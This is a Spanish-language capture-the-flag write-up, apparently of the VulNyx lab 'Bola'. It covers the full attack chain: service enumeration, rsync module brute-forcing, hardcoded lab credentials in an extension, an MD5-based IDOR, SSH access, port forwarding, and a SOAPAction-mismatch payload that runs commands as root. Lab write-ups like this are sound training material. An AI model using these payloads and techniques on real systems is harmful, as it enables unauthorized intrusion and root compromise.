# Bola

### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260818231631.png]]

**Servicios identificados:**

* **Puerto 22/TCP (SSH):** Servicio OpenSSH para acceso remoto por terminal. Ver teoría en [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>).
* **Puerto 80/TCP (HTTP):** Servidor web Apache httpd 2.4.62. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
* **Puerto 873/TCP (RSYNC):** Servicio Rsync (protocol version 32) para sincronización y transferencia de archivos.
* **Resolución de Nombres:** El escaneo revela una redirección hacia el dominio `bola.nyx`. Procedemos a añadir la entrada correspondiente en nuestro archivo `/etc/hosts`:

```
192.168.1.119 bola.nyx
```

***

### Enumeración Web y de Servicios

#### Inspección del Servidor Web (WhatWeb)

Analizamos las tecnologías y cabeceras del servidor web mediante `whatweb`:

![[Pasted image 20260818231739.png]]

Accedemos a través del navegador a `http://bola.nyx`, encontrándonos con la página corporativa principal:

![[Pasted image 20260818231608.png]]

Al explorar las rutas accesibles, localizamos un formulario de inicio de sesión en `/login/login.php`:

![[Pasted image 20260818232215.png]]

#### Fuzzing de Directorios Web (ffuf y dirsearch)

Dado que no disponemos de credenciales iniciales para el login, procedemos a realizar fuzzing de rutas y recursos web con `ffuf`:

```bash
ffuf -u "http://bola.nyx/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -e .php -t 40
```

![[Pasted image 20260818232205.png]]

Identificamos directorios y archivos clave como `/admin`, `/login`, `download.php` e `index.php`. Realizamos un fuzzing más profundo sobre el directorio `/admin`:

```bash
ffuf -u "http://bola.nyx/admin/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -e .php -t 40
```

![[Pasted image 20260818232623.png]]

De manera complementaria, ejecutamos `dirsearch` contra la raíz del sitio web para descubrir rutas adicionales y archivos ocultos:

```bash
dirsearch -u http://bola.nyx/
```

Ver guía y opciones avanzadas en [Fuzzing Cheat Sheet](<../../../Pentesting Notes/Web/Fuzzing/Cheat Sheet.md>).

![[Pasted image 20260819000356.png]]

#### Análisis de Endpoints Descubiertos (.well-known)

El análisis con `dirsearch` revela dos recursos de gran relevancia bajo el directorio `.well-known`:

1.  **Endpoint `/.well-known/openid-configuration`:** Al consultar este recurso en formato JSON, identificamos una fuga de nombres de usuarios registrados en el sistema:

    ```
    http://bola.nyx/.well-known/openid-configuration
    ```

    ![[Pasted image 20260819000727.png]]

    **Usuarios identificados:**

    * `d4t4s3c`
    * `ct0l4`
    * `jackie0x17`
2.  **Endpoint `/.well-known/security.txt`:** Contiene información sobre las políticas y contactos de seguridad, confirmando el correo corporativo del usuario `jackie0x17`:

    ```
    http://bola.nyx/.well-known/security.txt
    ```

    ![[Pasted image 20260819000806.png]]

***

### Enumeración y Fuerza Bruta del Servicio RSYNC (Puerto 873)

#### Descubrimiento de Módulos Ocultos (rsync-brute)

Comprobamos inicialmente si el servicio RSYNC permite listar recursos o módulos anónimamente de forma directa:

```bash
rsync rsync://bola.nyx
```

![[Pasted image 20260819002831.png]]

Al no obtener listado público, procedemos a realizar fuerza bruta sobre los nombres de los módulos compartidos utilizando la herramienta `rsync-brute`:

```bash
rsync-brute -t 192.168.1.119 -p 873 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

![[Pasted image 20260820022031.png]]

* **Hallazgo:** Descubrimos el módulo compartido denominado **`extensions`**.

#### Descarga y Análisis de Archivos en RSYNC

Listamos y descargamos los contenidos disponibles en el recurso `extensions`:

```bash
rsync rsync://bola.nyx/extensions
```

![[Pasted image 20260820022112.png]]

Descargamos los archivos expuestos:

1. `Password_manager_FirefoxExtension-VulNyx.pdf` (Guía de instalación de una extensión para Firefox).
2. `password_manager.zip` (Paquete comprimido con el código de la extensión).

Al descomprimir el archivo ZIP, inspeccionamos los archivos JavaScript contenidos y localizamos en `background.js` credenciales predeterminadas hardcodeadas:

![[Pasted image 20260820022309.png]]

```
jackie0x17@nyx.com:sbIJ0x9g{C3`
```

***

### Fase de Explotación / Intrusión

#### Acceso al Panel de Administración e Insecure Direct Object References (IDOR)

Utilizamos las credenciales obtenidas para autenticarnos a través del panel de login (`/login/login.php`):

![[Pasted image 20260820022459.png]]

Una vez dentro de `Portal Manager` (`/admin/admin.php`), observamos una sección con documentos descargables donde encontramos el archivo:

```
115a2cf084dd7e70a91187f799a745bb.pdf
```

*   **Análisis de la Vulnerabilidad IDOR:** Comprobamos que el nombre del archivo PDF corresponde exactamente con el hash MD5 del nombre del usuario propietario (`jackie0x17`):

    ```bash
    echo -n "jackie0x17" | md5sum
    # 115a2cf084dd7e70a91187f799a745bb
    ```

    La descarga se realiza mediante peticiones GET al endpoint `download.php?file_name={MD5}.pdf`. Al no existir validación de control de acceso ni autorización por sesión (IDOR), podemos generar los hashes MD5 de los demás usuarios enumerados previamente (`ct0l4` y `d4t4s3c`) para intentar recuperar sus respectivos archivos.

**1. Consulta para el usuario `ct0l4`:**

Calculamos su hash MD5:

```bash
echo -n "ct0l4" | md5sum
# 4a8f81d01d65d3468955191045816c85
```

![[Pasted image 20260820023916.png]]

Intentamos descargar `http://bola.nyx/download.php?file_name=4a8f81d01d65d3468955191045816c85.pdf`:

![[Pasted image 20260820024013.png]]

* **Resultado:** El archivo no se encuentra disponible (`Error: File does not exist`).

**2. Consulta para el usuario `d4t4s3c`:**

Calculamos su hash MD5:

```bash
echo -n "d4t4s3c" | md5sum
# 97035ded598faa2ce8ff63f7f9dd3b70
```

![[Pasted image 20260820024130.png]]

Solicitamos la descarga de `http://bola.nyx/download.php?file_name=97035ded598faa2ce8ff63f7f9dd3b70.pdf`:

![[Pasted image 20260820024117.png]]

* **Resultado:** Descargamos con éxito el documento privado titulado **"WSDL Server VulNyx - How to Connect"**.

#### Extracción de Credenciales y Acceso SSH Inicial

Al revisar detalladamente el contenido del documento PDF descargado, encontramos un ejemplo de implementación de un servicio WSDL en Python utilizando la librería `Spyne`:

![[Pasted image 20260820030214.png]]

En el fragmento de código se expone una contraseña hardcodeada:

```
VulNyxtestinglogin123
```

Probamos las credenciales descubiertas contra el servicio SSH para el usuario `d4t4s3c`:

```bash
ssh d4t4s3c@bola.nyx
```

![[Pasted image 20260820030303.png]]

* **Acceso obtenido:** Obtenemos una shell interactiva en el servidor bajo la identidad del usuario de bajos privilegios **`d4t4s3c`**.

***

### Escalada de Privilegios / Ejecución Remota de Código (RCE)

#### Reenvío de Puertos Local (SSH Local Port Forwarding)

En el documento PDF analizado se detalla la existencia de un servidor WSDL/SOAP que se ejecuta en el puerto interno **9000** (`127.0.0.1:9000`), el cual no es accesible externamente desde la red.

Para interactuar con el servicio desde nuestra máquina atacante y utilizar herramientas como Burp Suite o el navegador, establecemos un túnel de Port Forwarding mediante SSH:

```bash
ssh -L 9000:127.0.0.1:9000 d4t4s3c@bola.nyx
```

![[Pasted image 20260820030532.png]]

Accedemos a `http://localhost:9000` desde el navegador para verificar la disponibilidad del servicio:

![[Pasted image 20260820030601.png]]

#### Inspección del Esquema del Servicio WSDL (SOAP)

Consultamos la definición WSDL navegando al endpoint `http://localhost:9000/wsdl`:

![[Pasted image 20260820032203.png]]

**Estructura del servicio SOAP identificada:**

* **Operación `Login`:** Acepta `username` y `password` (mensaje `LoginRequest`) y devuelve `status` (mensaje `LoginResponse`).
* **Operación `ExecuteCommand`:** Acepta el parámetro `cmd` (mensaje `ExecuteCommandRequest`) y devuelve `output` (mensaje `ExecuteCommandResponse`).

#### Evasión de Restricciones (SOAPAction Mismatch) y RCE como Root

Capturamos la petición con Burp Suite e intentamos invocar directamente la operación `ExecuteCommand`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
      <ExecuteCommand xmlns="http://localhost/wsdl/VulNyxSOAP.wsdl">
         <command>whoami</command>
      </ExecuteCommand>
   </soap:Body>
</soap:Envelope>
```

![[Pasted image 20260820032224.png]]

* **Respuesta del Servidor:** Devuelve `403 Forbidden` con el mensaje `Only allowed in internal networks`, indicando un filtro que bloquea llamadas directas a este método.

**Bypass del Control de Acceso:**

Para eludir la restricción, explotamos una discrepancia en el parser SOAP/WSGI (Spyne) combinando la cabecera `SOAPAction` con un cuerpo XML diferente:

1. Declaramos en la cabecera HTTP: **`SOAPAction: ExecuteCommand`**.
2. Estructuramos el cuerpo del mensaje XML utilizando la etiqueta permitida **`<LoginRequest>`**, pero encapsulando el parámetro de ejecución **`<cmd>whoami</cmd>`**.

Payload final enviado:

```xml
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns="http://localhost/wsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <LoginRequest> 
         <cmd>whoami</cmd>
      </LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

![[Pasted image 20260820033556.png]]

*   **Impacto Crítico:** El servidor procesa la acción `ExecuteCommand` eludiendo el filtro y devolviendo en la respuesta:

    ```xml
    <tns:ExecuteCommandResult>root</tns:ExecuteCommandResult>
    ```

    Esto confirma la ejecución remota de comandos (**RCE**) ejecutándose directamente en el contexto del superusuario **`root`**. A través de este vector es posible entablar una reverse shell interactiva o ejecutar comandos arbitrarios con privilegios máximos en el sistema.

***

### Relaciones y Conceptos

* **Teoría:** [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>), [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>), [Fuzzing Cheat Sheet](<../../../Pentesting Notes/Web/Fuzzing/Cheat Sheet.md>), [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>)
* **Laboratorios Relacionados:** [Express](Express.md) (Comparte resolución por VHosts, descubrimiento de servicios internos en puerto 9000 y escalada a root), [JarJar](JarJar.md) (Comparte resolución por VHosts, paneles web y acceso SSH), [Internal](../../DockerLabs/Facil/Internal.md) (Comparte port forwarding y explotación de servicios locales)
